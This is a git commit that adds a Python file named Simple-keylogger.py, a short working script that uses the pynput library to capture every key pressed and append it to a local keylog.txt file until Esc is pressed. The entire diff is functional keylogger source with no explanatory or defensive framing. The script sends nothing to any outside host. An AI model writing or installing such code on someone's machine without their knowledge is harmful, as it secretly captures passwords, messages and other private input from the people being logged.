a11b76670713b0a031d5e3b438aeb3fc108bd32d
Desma Deborah <104067764+41K36U14N@users.noreply.github.com>
2024-07-07 21:21:44 +0200

    Update Simple-keylogger.py

--- Simple-keylogger.py
+++ Simple-keylogger.py
@@ -1,1 +1,17 @@
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key}")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
